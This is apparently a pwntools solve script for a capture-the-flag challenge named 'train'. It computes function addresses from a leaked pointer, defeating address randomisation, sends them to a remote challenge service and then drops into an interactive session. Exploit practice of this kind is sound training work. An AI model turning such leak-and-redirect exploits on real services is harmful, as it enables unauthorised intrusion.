from pwn import *

#io = process("train")

io = remote("172.31.94.166", 5000)

"""
0x0000134d    3     57 sym.final_station
0x00001386    4     60 sym.unimportant_station
0x000012db    1     57 sym.station_4
0x00001294    1     14 sym.station_2
0x000011ea    1    148 sym.station_0
0x00001314    1     57 sym.station_5
0x000012a2    1     57 sym.station_3
0x0000127e    1     22 sym.station_1
"""
offset_station_0 = 0x000011ea
offset_station_1 = offset_station_0 - 0x0000127e
offset_station_2 = offset_station_0 - 0x00001294
offset_station_3 = offset_station_0 - 0x000012a2
offset_station_4 = offset_station_0 - 0x000012db
offset_station_5 = offset_station_0 - 0x00001314
offset_final_station = offset_station_0 - 0x0000134d
offset_unimportant_station = offset_station_0 - 0x00001386

io.recvuntil("station: ");
station_0 = int(io.recvuntil("\n", drop=True), 16)
station_1 = station_0 - offset_station_1
station_2 = station_0 - offset_station_2
station_3 = station_0 - offset_station_3
station_4 = station_0 - offset_station_4
station_5 = station_0 - offset_station_5
station_final = station_0 - offset_final_station
unimporatant_station = station_0 - offset_unimportant_station

io.sendline(bytes(str(hex(station_0)), 'utf-8'))
io.sendline(bytes(str(hex(station_1)), 'utf-8'))
io.sendline(bytes(str(hex(station_2)), 'utf-8'))
io.sendline(bytes(str(hex(station_3)), 'utf-8'))
io.sendline(b"59");
io.sendline(bytes(str(hex(station_4)), 'utf-8'))
io.sendline(b"0");
io.sendline(bytes(str(hex(station_5)), 'utf-8'))
io.sendline(b"0");
io.sendline(bytes(str(hex(unimporatant_station)), 'utf-8'))
io.sendline(bytes(str(hex(station_final)), 'utf-8'))

io.interactive()
